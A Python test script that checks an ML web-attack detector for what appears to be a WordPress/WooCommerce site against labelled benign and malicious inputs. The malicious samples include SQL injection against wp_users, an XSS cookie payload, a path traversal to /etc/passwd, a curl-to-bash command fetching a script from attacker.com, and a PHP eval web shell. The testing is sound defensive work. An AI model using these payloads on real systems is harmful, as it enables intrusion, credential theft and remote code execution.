import sys
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BACKEND_DIR = os.path.dirname(SCRIPT_DIR)
sys.path.insert(0, BACKEND_DIR)

from src.engine.ml_detector import MLDetector

det = MLDetector()
print("MLDetector Status:", det.get_status())

test_payloads = [
    ("Legitimate Blog Comment", "Thank you for this informative post about security", False),
    ("WooCommerce Checkout", "order_id=4592&billing_city=Dhaka&payment_method=bkash", False),
    ("Gutenberg Content", "<!-- wp:paragraph --><p>Welcome to our store</p>", False),
    ("Elementor Header JSON", '{"version":"0.4","title":"Header Template","type":"header"}', False),
    ("Search Query Filter", "s=modern+responsive+theme&post_type=product&lang=en", False),
    ("SQL Injection", "id=1 UNION SELECT 1,username,password FROM wp_users--", True),
    ("SQL Injection Auth Bypass", "admin' OR '1'='1'--", True),
    ("XSS Attack", "<script>alert(document.cookie)</script>", True),
    ("Path Traversal / LFI", "../../../../etc/passwd", True),
    ("RCE Attack", "; curl -s http://attacker.com/rev.sh | bash", True),
    ("WebShell Upload", "<?php @eval($_POST['cmd']); ?>", True)
]

all_passed = True
for name, payload, expected_attack in test_payloads:
    res = det.detect(payload)
    is_attack = res["attack"]
    prob = res["probability"]
    passed = (is_attack == expected_attack)
    if not passed:
        all_passed = False
    status = "[PASS]" if passed else "[FAIL]"
    cat = res.get("category")
    print(f"  {status} | {name:<26} -> P(Attack): {prob:6.2%} | Attack: {is_attack:<5} | Category: {cat}")

print("\nAll Probes Passed:", all_passed)
